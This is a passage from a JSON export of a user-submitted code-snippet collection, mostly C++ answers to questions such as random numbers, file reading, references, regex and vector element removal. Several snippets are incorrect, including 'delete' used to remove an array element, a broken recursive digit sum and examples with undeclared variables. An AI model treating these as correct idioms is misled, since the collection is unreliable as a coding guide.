    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n#include <stdio.h>      /* NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int Main() {   int randomNumber;    /* initialize random seed: */   srand (time(NULL));    /* generate random number between 1 and 10: */   randomNumber = rand() % 10 + 1; \tv1 = rand() % 100;         // v1 in the range 0 to 99 \tv2 = rand() % 100 + 1;     // v2 in the range 1 to 100 \tv3 = rand() % 30 + 1985;   // v3 in the range 1985-2014  }\n#include<iostream> #include<cstdlib> using namespace std;   int main(){       // Providing a seed value     srand((unsigned) time(NULL));       // Loop to get 5 random numbers     for(int i=1; i<=5; i++){                   // Retrieve a random number between 100 and 200         // Offset = 100         // Range = 101         int random = 100 + (rand() % 101);           // Print the random number         cout<<random<<endl;     }       return 1; } \n/*The problem with srand(time(NULL)) and rand() is that if you use them in a loop it'll probably be executed during the same clock period and therefore rand() will return the same number. To solve this you can use the library random to help you.*/  #include <random>  std::random_device rd; std::mt19937 e{rd()}; std::uniform_int_distribution<int> dist{1, 5}; //Limits of the interval //Returns a random number between {1, 5} with dist(e);\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3484,
    "keyword": null,
    "link": null,
    "title": " random number of 0 or 1 c++",
    "description": "#include <time.h> // So we can use time() function #include <iostream> // To output results to console  int main() // Main function required in all C++ programs and first function to be called { \tsrand( time(NULL) ); //Randomize seed initialization \tint randNum = rand() % 2; // Generate a random number between 0 and 1  \tstd::cout << randNum; // Output the results to console \treturn 0; //Generate an \"EXIT SUCCESS\" return code }\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3485,
    "keyword": null,
    "link": null,
    "title": " random numbers c++",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n/*The problem with srand(time(NULL)) and rand() is that if you use them in a loop it'll probably be executed during the same clock period and therefore rand() will return the same number. To solve this you can use the library random to help you.*/  #include <random>  std::random_device rd; std::mt19937 e{rd()}; std::uniform_int_distribution<int> dist{1, 5}; //Limits of the interval //Returns a random number between {1, 5} with dist(e);\n#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} }\n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3486,
    "keyword": null,
    "link": null,
    "title": " random string c++",
    "description": "#include <string>  string  gen_random(int len) {     string s;     static const char alphanum[] =         \"0123456789\"         \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"         \"abcdefghijklmnopqrstuvwxyz\";      for (int i = 0; i < len; ++i) {         s += alphanum[rand() % (sizeof(alphanum) - 1)];     }      return s; }\n  string  gen_random(int len) {         string s;         static const char alphanum[] =             \"0123456789\"             \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"             \"abcdefghijklmnopqrstuvwxyz\";          for (int i = 0; i < len; ++i) {             s+= alphanum[rand() % (sizeof(alphanum) - 1)];              }       return s;     \n",
    "reg_date": "2021-10-12T11:42:56.000Z"
  },
  {
    "id": 3487,
    "keyword": null,
    "link": null,
    "title": " range based for loop c++",
    "description": "array<int, 5> values = {1, 2, 3, 4, 10}; // the type declaration below must be consistent with the array type for (int x : values){ //we use a colon instead of in cout << x << endl; }\nfor (int i=0; i<5; ++i) {   cout << i << \" \"; } // output is 0 1 2 3 4; note 5 is excluded since < is used and not <=\n1 #include <iostream> 2 #include <array> 3 #include <cstdlib> 4 5 using namespace std; 6 7 int main(){ 8 array<int, 5> d = {1, 2, -1, 3, 5}; 9 cout << \"Items before modification: \" << endl; 10 for (int item : d){ 11 cout << item << \" \"; 12 } 13 //multiple elements of d by 3 14 for (int &itemRef : d){ 15 itemRef *= 3; 16 } 17 cout << endl << \"Items after modification: \" << endl; 18 for (int item : d){ 19 cout << item << \" \"; 20 } 21 cout << endl; 22 return 0; 23 }\nfor (<variable_declaration> : expression){ //statements }\nfor(auto& i : arr)    cout << i << \" \";\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3488,
    "keyword": null,
    "link": null,
    "title": " range based for loop c++ with reference",
    "description": "1 #include <iostream> 2 #include <array> 3 #include <cstdlib> 4 5 using namespace std; 6 7 int main(){ 8 array<int, 5> d = {1, 2, -1, 3, 5}; 9 cout << \"Items before modification: \" << endl; 10 for (int item : d){ 11 cout << item << \" \"; 12 } 13 //multiple elements of d by 3 14 for (int &itemRef : d){ 15 itemRef *= 3; 16 } 17 cout << endl << \"Items after modification: \" << endl; 18 for (int item : d){ 19 cout << item << \" \"; 20 } 21 cout << endl; 22 return 0; 23 }\nfor (<variable_declaration> : expression){ //statements }\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3489,
    "keyword": null,
    "link": null,
    "title": " range of int",
    "description": " [8-bit] signed char: -127 to 127  [8-bit] unsigned char: 0 to 255  [16-bit]signed short: -32767 to 32767  [16-bit]unsigned short: 0 to 65535  [32-bit]signed long: -2147483647 to 2147483647  [32-bit]unsigned long: 0 to 4294967295  [64-bit]signed long long: -9223372036854775807 to 9223372036854775807  [64-bit]unsigned long long: 0 to 18446744073709551615 \nTypeName\tBytes\t        Range of Values   int\t\t  4\t    -2,147,483,648 to 2,147,483,647\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3490,
    "keyword": null,
    "link": null,
    "title": " range of long long in c++",
    "description": "Long Data Type\t          Size             (in bytes)\tRange long int\t            4\t         -2,147,483,648 to 2,147,483,647 unsigned long int\t    4\t         0 to 4,294,967,295 long long int\t        8\t         -(2^63) to (2^63)-1 unsigned long long int\t8\t         0 to 18,446,744,073,709,551,615\n2^63\nint myNum = 5;               // Integer (whole number) float myFloatNum = 5.99;     // Floating point number double myDoubleNum = 9.98;   // Floating point number char myLetter = 'D';         // Character bool myBoolean = true;       // Boolean string myText = \"Hello\";     // String\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3491,
    "keyword": null,
    "link": null,
    "title": " rank() in c++",
    "description": "// array rank example #include <iostream> #include <type_traits>  int main() {   std::cout << \"rank:\" << std::endl;   std::cout << \"int: \" << std::rank<int>::value << std::endl;   std::cout << \"int[]: \" << std::rank<int[]>::value << std::endl;   std::cout << \"int[][10]: \" << std::rank<int[][10]>::value << std::endl;   std::cout << \"int[10][10]: \" << std::rank<int[10][10]>::value << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3492,
    "keyword": null,
    "link": null,
    "title": " raspberry pi mount external hard drive",
    "description": "UUID=5C24-1453 /mnt/mydisk fstype defaults,auto,users,rw,nofail 0 0\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3493,
    "keyword": null,
    "link": null,
    "title": " raw string in c++",
    "description": "//EXAMPLE std::string sRaw = R\"(aaa\\ttt %)\";     //   aaa/ttt % std::string sNonRaw = \"aaa\\ttt %\";   //     aaa     tt % std::cout << sRaw << \"\\n\"; std::cout << sNonRaw << \"\\n\";  //SYNTAX // R\"(<string-with-raw-values>)\" // R\"(...)\"\n#include <iostream>   int main() {  \t \t//Display in Multiline using escape character /n \tconst char* example2 = \"Line1\\n\" \t\"Line2\\n\" \t\t\"Line3\\n\" \t\t\"Line4\\n\" \t\t; \tstd::cout << example2 << std::endl; \tstd::cout << \"===================================\" << std::endl; \t// display in multiline using Raw \tconst char* example = R\"(Line1 Line2 Line3  Line4  )\";//no need to use escape character  /n \tstd::cout << example << std::endl;  \tstd::cin.get(); } \n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3494,
    "keyword": null,
    "link": null,
    "title": " ray sphere intersection equation",
    "description": "bool hit_sphere(const vec3& center, float radius, const ray& r){     vec3 oc = r.origin() - center;     float a = dot(r.direction(), r.direction());     float b = 2.0 * dot(oc, r.direction());     float c = dot(oc,oc) - radius*radius;     float discriminant = b*b - 4*a*c;     return (discriminant>0); } \nfloat hit_sphere(const vec3& center, float radius, const ray& r){     vec3 oc = r.origin() - center;     float a = dot(r.direction(), r.direction());     float b = 2.0 * dot(oc, r.direction());     float c = dot(oc,oc) - radius*radius;     float discriminant = b*b - 4*a*c;     if(discriminant < 0){         return -1.0;     }     else{         return (-b - sqrt(discriminant)) / (2.0*a);     } } \n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3495,
    "keyword": null,
    "link": null,
    "title": " react cookie",
    "description": "createCookieInHour: (cookieName, cookieValue, hourToExpire) => {     let date = new Date();     date.setTime(date.getTime()+(hourToExpire*60*60*1000));     document.cookie = cookieName + \" = \" + cookieValue + \"; expires = \" +date.toGMTString(); },  //create any new cookie  createCookieInHour('cookieName', 'cookieValue', 5);  //view cookies let cookie = document.cookie.split(';'); console.log('cookie : ', cookie);\n// server.jsrequire('@babel/register'); const express = require('express');const serverMiddleware = require('./src/server').default;const cookiesMiddleware = require('universal-cookie-express'); const app = express(); app  .use('/assets', express.static('dist'))  .use(cookiesMiddleware())  .use(serverMiddleware); app.listen(8080, function() {  console.log('Listening on 8080...');});\n",
    "reg_date": "2021-10-12T11:42:57.000Z"
  },
  {
    "id": 3496,
    "keyword": null,
    "link": null,
    "title": " read a file c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n/ fstream::open / fstream::close #include <fstream>      // std::fstream  int main () {    std::fstream fs;   fs.open (\"test.txt\", std::fstream::in | std::fstream::out | std::fstream::app);    fs << \" more lorem ipsum\";    fs.close();    return 0; }\n// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \nint a, b;      ifstream bd;  myfile.open(\"file.txt\");  if (myfile.is_open()) \twhile (bd >> a >> b)     \tcout << a << b << endl;  else cout << \"ERROR\";\n",
    "reg_date": "2021-10-12T11:42:58.000Z"
  },
  {
    "id": 3497,
    "keyword": null,
    "link": null,
    "title": " read a whole line from the input",
    "description": "string s;//possibly containing spaces getline(cin, s);\n",
    "reg_date": "2021-10-12T11:42:58.000Z"
  },
  {
    "id": 3498,
    "keyword": null,
    "link": null,
    "title": " read char from text file c++",
    "description": "#include <iostream> #include <fstream> #include <vector>  using std::cout; using std::cerr; using std::endl; using std::string; using std::ifstream; using std::vector;  int main() {     string filename(\"input.txt\");     vector<char> bytes;     char byte = 0;      ifstream input_file(filename);     if (!input_file.is_open()) {         cerr << \"Could not open the file - '\"              << filename << \"'\" << endl;         return EXIT_FAILURE;     }      while (input_file.get(byte)) {         bytes.push_back(byte);     }     for (const auto &i : bytes) {         cout << i << \"-\";     }     cout << endl;     input_file.close();      return EXIT_SUCCESS; }\n",
    "reg_date": "2021-10-12T11:42:58.000Z"
  },
  {
    "id": 3499,
    "keyword": null,
    "link": null,
    "title": " read comma separated text file in c++",
    "description": "#include <fstream> #include <sstream> #include <iostream> #include <vector>  int main() {     std::ifstream inFile(\"registration.txt\");     if (inFile.is_open())     {         std::string line;         while( std::getline(inFile,line) )         {             std::stringstream ss(line);              std::string ID, fname, lname;             std::getline(ss,ID,',');    std::cout<<\"\\\"\"<<ID<<\"\\\"\";             std::getline(ss,fname,','); std::cout<<\", \\\"\"<<fname<<\"\\\"\";             std::getline(ss,lname,','); std::cout<<\", \\\"\"<<lname<<\"\\\"\";              std::vector<std::string> enrolled;             std::string course;             while( std::getline(ss,course,',') )             {                  enrolled.push_back(course); std::cout<<\", \\\"\"<<course<<\"\\\"\";             }             std::cout<<\"\\n\";         }     }     return 0; }\n#include <iostream> #include <fstream> #include <string>  ifstream file(\"filename.txt\"); string data = \"\"; while(getline(file, data,',')) {   cout << data << endl; } file.close();\n",
    "reg_date": "2021-10-12T11:42:58.000Z"
  },
  {
    "id": 3500,
    "keyword": null,
    "link": null,
    "title": " read file into vector",
    "description": "std::vector<char> vec; if (FILE *fp = fopen(\"filename\", \"r\")) { \tchar buf[1024]; \twhile (size_t len = fread(buf, 1, sizeof(buf), fp))     { \t\tv.insert(vec.end(), buf, buf + len);     } \tfclose(fp); }\n#include <iostream> #include <iterator> #include <fstream> #include <vector> #include <algorithm> // for std::copy  int main() {   std::ifstream is(\"numbers.txt\");   std::istream_iterator<double> start(is), end;   std::vector<double> numbers(start, end);   std::cout << \"Read \" << numbers.size() << \" numbers\" << std::endl;    // print the numbers to stdout   std::cout << \"numbers read in:\\n\";   std::copy(numbers.begin(), numbers.end(),              std::ostream_iterator<double>(std::cout, \" \"));   std::cout << std::endl;  } \n",
    "reg_date": "2021-10-12T11:42:58.000Z"
  },
  {
    "id": 3501,
    "keyword": null,
    "link": null,
    "title": " read potentiometer arduino",
    "description": "void loop() {   val = analogRead(potPin);    // read the value from the sensor   digitalWrite(ledPin, HIGH);  // turn the ledPin on   delay(val);                  // stop the program for some time   digitalWrite(ledPin, LOW);   // turn the ledPin off   delay(val);                  // stop the program for some time }\n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3502,
    "keyword": null,
    "link": null,
    "title": " read string with spaces in c++",
    "description": "Using getline() will help you. Example:   int main() {    std::string name, title;     std::cout << \"Enter your name: \"; //Name: Robert De Niro    std::getline(std::cin, name);     std::cout << \"Enter your favourite movie: \"; // title: The Irishman    std::getline(std::cin, title);     std::cout << name << \"'s favourite movie is \" << title; } \nstring s; getline(cin,s);\nstd::string str;  std::getline( std::cin, str);\n#include <string> string s; getline(cin, s);\n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3503,
    "keyword": null,
    "link": null,
    "title": " read text from file c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n#include<iostream> #include<fstream>  using namespace std;  int main() {   ifstream myReadFile;  myReadFile.open(\"text.txt\");  char output[100];  if (myReadFile.is_open()) {  while (!myReadFile.eof()) {       myReadFile >> output;     cout<<output;    } } myReadFile.close(); return 0; }  \n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3504,
    "keyword": null,
    "link": null,
    "title": " reading in lines from a file to a vector c++",
    "description": "std::string str; // Read the next line from File untill it reaches the end. while (std::getline(in, str)) {     // Line contains string of length > 0 then save it in vector     if(str.size() > 0)         vecOfStrs.push_back(str); }\n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3505,
    "keyword": null,
    "link": null,
    "title": " reading in two strings from a text file c++",
    "description": "Plain Egg 1.45  Bacon and Egg 2.45  Muffin 0.99  French Toast 1.99  Fruit Basket 2.49  Cereal 0.69  Lemon Tea 0.75  Cheeseburger 2.25  menu[0].MenuItem  = Plain Egg menu[0].MenuPrice = 1.45  menu[1].MenuItem  = Bacon and Egg menu[1].MenuPrice = 2.45  menu[2].MenuItem  = Muffin menu[2].MenuPrice = 0.99  menu[3].MenuItem  = French Toast menu[3].MenuPrice = 1.99  menu[4].MenuItem  = Fruit Basket menu[4].MenuPrice = 2.49  menu[5].MenuItem  = Cereal menu[5].MenuPrice = 0.69  menu[6].MenuItem  = Lemon Tea menu[6].MenuPrice = 0.75  menu[7].MenuItem  = Cheeseburger menu[7].MenuPrice = 2.25 \n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3506,
    "keyword": null,
    "link": null,
    "title": " reads the string in then determines if the string is a palindrome.",
    "description": "#include <iostream> using namespace std;   // Iterative function to check if given string is a palindrome or not bool isPalindrome(string str) {     int low = 0;     int high = str.length() - 1;       while (low < high)     {         // if mismatch happens         if (str[low] != str[high])             return false;           low++;         high--;     }       return true; }   int main() {     string str = \"XYXYX\";       if (isPalindrome(str))         cout << \"Palindrome\";     else         cout << \"Not Palindrome\";       return 0; } \n#include <iostream> using namespace std;   // Recursive function to check if str[low..high] is a palindrome or not bool isPalindrome(string str, int low, int high) {     // base case     if (low >= high)         return true;       // return false if mismatch happens     if (str[low] != str[high])         return false;       // move to next the pair     return isPalindrome(str, low + 1, high - 1); }   int main() {     string str = \"XYBYBYX\";     int len = str.length();       if (isPalindrome(str, 0, len - 1))         cout << \"Palindrome\";     else         cout << \"Not Palindrome\";       return 0; } \n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3507,
    "keyword": null,
    "link": null,
    "title": " rectangle pattern in c++",
    "description": "#include <iostream> using namespace std; int main() {     int col, row;     int i,j;      cout<< \"Enter number of rows and columns: \";     cin >> row >> col;      for (i=1; i <=row; i++){         for (j=1; j<=col; j++){             cout << \"*\";         }         cout << \"\\n\";     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:59.000Z"
  },
  {
    "id": 3508,
    "keyword": null,
    "link": null,
    "title": " recursion in c++",
    "description": "//AUTHOR:praveen //Function calling itself  //Example in c++ #include<iostream> using namespace std; int recursion(int a){   \tif(a==1)//BASE CASE       return 0; \tcout<<a;   \ta=a-1;   \treturn recursion(a);//FUNCTION CALLING ITSELF } int main(){   \tint a=5;  \trecursion(a);   \treturn 0; } //OUTPUT: 5 4 3 2 \n#include <iostream> #include <cstdlib> //had to force it becasue my compiler (Code::Blocks) does not contain system.  using namespace std; /*int n = 1, sum = 0;  int sumDigits(int n, int sum) {     // \tif (n == 0)     {         return sum;     }     else     {         // applying recursion and returning the value into the function         sum = sum + n\u0010; \t\tn= n/10;         return sumDigits(n, sum);     } }  int main(int argc, char* argv[]) { \tn = 1, sum = 0;          cout << \"Enter a non-negative integer: \";         cin >> n;         sum = sumDigits (n, sum);         cout << \"The sum of all digits \"<< n << \" is: \" << sum << endl;  \tsystem (\"PAUSE\");          return 0; } */  int sumDigits(int &);  int main() { \tint n; \tsumDigits(n); }  int sumDigits(int &n) {     cout << \"Enter a non-negative integer: \";     cin >> n;         if (n == 1)         {             return 1;         }         else         {             return (n - 1) + n;         }     cout << \"The sum of all digits \"<< n << \" is: \" << n << endl;   \tsystem (\"PAUSE\");          return 0; }\n//recursion in c++ //factorial #include<iostream> #include<bits/stdc++.h> using namespace std;  int factorialfun(int num) { \tif (num>0) \t{ \t\treturn num*factorialfun(num-1); \t} \telse \t{ \t\treturn 1; \t} } int main() { \tint num; \tcin>>num; \tcout<<factorialfun(num); } \n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3509,
    "keyword": null,
    "link": null,
    "title": " recursion in cpp with reference",
    "description": "#include <iostream> #include <cstdlib> //had to force it becasue my compiler (Code::Blocks) does not contain system.  using namespace std; /*int n = 1, sum = 0;  int sumDigits(int n, int sum) {     // \tif (n == 0)     {         return sum;     }     else     {         // applying recursion and returning the value into the function         sum = sum + n\u0010; \t\tn= n/10;         return sumDigits(n, sum);     } }  int main(int argc, char* argv[]) { \tn = 1, sum = 0;          cout << \"Enter a non-negative integer: \";         cin >> n;         sum = sumDigits (n, sum);         cout << \"The sum of all digits \"<< n << \" is: \" << sum << endl;  \tsystem (\"PAUSE\");          return 0; } */  int sumDigits(int &);  int main() { \tint n; \tsumDigits(n); }  int sumDigits(int &n) {     cout << \"Enter a non-negative integer: \";     cin >> n;         if (n == 1)         {             return 1;         }         else         {             return (n - 1) + n;         }     cout << \"The sum of all digits \"<< n << \" is: \" << n << endl;   \tsystem (\"PAUSE\");          return 0; }\nvoid sum_digits(int & n, int & sum) {   if ( n == 0 ) return;   sum += n % 10;   n /= 10;   sum_digits(n, sum); }  #include <iostream> using namespace std;  int main() {   int n, sum=0;   cout << \"enter a non-negative number\" << endl;   cin >> n;   if ( n < 0 ) return -1; // don't trust the user   sum_digits(n,sum);   cout << \"sum is \" << sum << endl; }\n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3510,
    "keyword": null,
    "link": null,
    "title": " reference function in c++",
    "description": "// function definition to swap the values. void swap(int &x, int &y) {    int temp;    temp = x; /* save the value at address x */    x = y;    /* put y into x */    y = temp; /* put x into y */       return; }\n#include <iostream> using namespace std;  // function declaration void swap(int &x, int &y);  int main () {    // local variable declaration:    int a = 100;    int b = 200;      cout << \"Before swap, value of a :\" << a << endl;    cout << \"Before swap, value of b :\" << b << endl;     /* calling a function to swap the values using variable reference.*/    swap(a, b);     cout << \"After swap, value of a :\" << a << endl;    cout << \"After swap, value of b :\" << b << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3511,
    "keyword": null,
    "link": null,
    "title": " reference variablesr in c++",
    "description": "#include <iostream>   using namespace std;   int main () {    // declare simple variables    int    i;    double d;      // declare reference variables    int&    r = i;    double& s = d;        i = 5;    cout << \"Value of i : \" << i << endl;    cout << \"Value of i reference : \" << r  << endl;      d = 11.7;    cout << \"Value of d : \" << d << endl;    cout << \"Value of d reference : \" << s  << endl;        return 0; }\nValue of i : 5 Value of i reference : 5 Value of d : 11.7 Value of d reference : 11.7 \n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3512,
    "keyword": null,
    "link": null,
    "title": " references in c++",
    "description": "#include <vector>  void simple_reference_example() {     int x;      int &y = x;     // y refers directly to x.     x = 10;      std::cout << y; // prints 10  }  /* careful! edits to d in this function affect the original */ void pass_by_ref(std::vector<int> &d) { \td[0] = 10; }  /* 'const' prevents changing of data in d */ void pass_by_const_ref(const std::vector<int> &d) { }  int main(){ \tstd::vector<int> data(1, 0);   // initialize 1 element vector w/ the value 0     pass_by_ref(ints);     std::cout << data[0];          // prints 10   \tpass_by_const_ref(ints); } \n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3513,
    "keyword": null,
    "link": null,
    "title": " regex for phone number c++",
    "description": "std::regex r(\"\\\\(\\\\d{3}\\\\) \\\\d{3}-\\\\d{4}\"); // e.g. \"(012) 345-6789\"  auto isValidPhoneNumber = std::regex_match(phone_num_str, r);\n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3514,
    "keyword": null,
    "link": null,
    "title": " regex match Function in C++",
    "description": "#include <iostream> #include <string> #include <regex> using namespace std;   int main () {      if (regex_match (\"softwareTesting\", regex(\"(soft)(.*)\") ))       cout << \"string:literal => matched\\n\";      const char mystr[] = \"SoftwareTestingHelp\";    string str (\"software\");    regex str_expr (\"(soft)(.*)\");      if (regex_match (str,str_expr))       cout << \"string:object => matched\\n\";      if ( regex_match ( str.begin(), str.end(), str_expr ) )       cout << \"string:range(begin-end)=> matched\\n\";      cmatch cm;    regex_match (mystr,cm,str_expr);         smatch sm;    regex_match (str,sm,str_expr);         regex_match ( str.cbegin(), str.cend(), sm, str_expr);    cout << \"String:range, size:\" << sm.size() << \" matches\\n\";          regex_match ( mystr, cm, str_expr, regex_constants::match_default );      cout << \"the matches are: \";    for (unsigned i=0; i<sm.size(); ++i) {       cout << \"[\" << sm[i] << \"] \";    }      cout << endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3515,
    "keyword": null,
    "link": null,
    "title": " regexp like oracle c++",
    "description": "WHERE REGEXP_LIKE(first_name, '^Ste(v|ph)en$') \n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3516,
    "keyword": null,
    "link": null,
    "title": " registering a new QML type",
    "description": " qmlRegisterType<MyClass>(\"MyClass\", 1,0, \"MyClass\");\n",
    "reg_date": "2021-10-12T11:43:00.000Z"
  },
  {
    "id": 3517,
    "keyword": null,
    "link": null,
    "title": " remove () not working c++",
    "description": "remove () const char    \n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3518,
    "keyword": null,
    "link": null,
    "title": " remove a element from an array c++",
    "description": "delete myarray[elemen];\ndelete arrayname[index]\n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3519,
    "keyword": null,
    "link": null,
    "title": " remove at index vector c++",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\nvec.erase(vec.begin() + index); \n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3520,
    "keyword": null,
    "link": null,
    "title": " remove character from string on condition c++",
    "description": "class IsChars { public:     IsChars(const char* charsToRemove) : chars(charsToRemove) {};      bool operator()(char c)     {         for(const char* testChar = chars; *testChar != 0; ++testChar)         {             if(*testChar == c) { return true; }         }         return false;     }  private:     const char* chars; }; auto chars_to_remove = \"()- \"; str.erase(std::remove_if(str.begin(), str.end(), IsChars(chars_to_remove)), str.end());\n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3521,
    "keyword": null,
    "link": null,
    "title": " remove duplicates from vector c++",
    "description": "sort( vec.begin(), vec.end() ); vec.erase( unique( vec.begin(), vec.end() ), vec.end() );\nsort( vec.begin(), vec.end() ); vec.erase( unique( vec.begin(), vec.end() ), vec.end() ); \nsort( res.begin(), res.end() ); res.erase( unique( res.begin(), res.end() ), res.end() );  SYNTAX:  ForwardIterator unique (ForwardIterator first, ForwardIterator last);  first: Forward iterator to the first element in the container. last: forward iterator to the last element in the container.\nstd::vector<std::string> name;  .... if (std::find(name.begin(), name.end(), someName) == name.end()) {   // someName not in name, add it   name.push_back(someName); } \n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3522,
    "keyword": null,
    "link": null,
    "title": " remove element by index from vector c++",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\n// Why not setup a lambda you can use again & again auto removeByIndex =    []<class T>(std::vector<T> &vec, unsigned int index) { \t// This is the meat & potatoes   \tvec.erase(vec.begin() + index); };  // Then you can throw whatever vector at it you desire std::vector<std::string> stringvec = {\"Hello\", \"World\"}; // Will remove index 1: \"World\" removeByIndex(stringvec, 1); // Vector of integers, we will use push_back std::vector<unsigned int> intvec; intvec.push_back(33); intvec.push_back(66); intvec.push_back(99); // Will remove index 2: 99 removeByIndex(intvec, 2);\n",
    "reg_date": "2021-10-12T11:43:01.000Z"
  },
  {
    "id": 3523,
    "keyword": null,
    "link": null,
    "title": " remove element by value vector c++",
